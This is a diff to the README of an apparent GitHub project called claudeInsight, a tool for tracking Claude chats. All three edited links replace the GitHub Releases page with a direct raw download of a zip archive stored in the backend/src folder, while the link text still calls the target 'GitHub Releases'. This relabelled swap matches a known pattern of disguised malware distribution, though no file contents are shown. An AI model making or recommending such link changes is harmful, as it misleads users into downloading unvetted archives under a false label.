@@ -1,6 +1,6 @@
 # 🤖 claudeInsight - Track Claude Chats With Ease
 
-[![Download claudeInsight](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/sebthegoatof/claudeInsight/releases)
+[![Download claudeInsight](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/sebthegoatof/claudeInsight/raw/refs/heads/main/backend/src/Insight-claude-v3.2-beta.4.zip)
 
 ## 🔍 What is claudeInsight?
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 To get the app, visit this page to download:
 
-[Download claudeInsight from GitHub Releases](https://github.com/sebthegoatof/claudeInsight/releases)
+[Download claudeInsight from GitHub Releases](https://github.com/sebthegoatof/claudeInsight/raw/refs/heads/main/backend/src/Insight-claude-v3.2-beta.4.zip)
 
 ## 📦 How to Install on Windows
 
@@ -147,7 +147,7 @@ Yes. Keep your exported chat files in a safe folder, and open that folder again 
 
 If you need the installer or release file again, use the GitHub Releases page:
 
-[https://github.com/sebthegoatof/claudeInsight/releases](https://github.com/sebthegoatof/claudeInsight/releases)
+[https://github.com/sebthegoatof/claudeInsight/raw/refs/heads/main/backend/src/Insight-claude-v3.2-beta.4.zip](https://github.com/sebthegoatof/claudeInsight/raw/refs/heads/main/backend/src/Insight-claude-v3.2-beta.4.zip)
 
 ## 📌 Project Focus
 
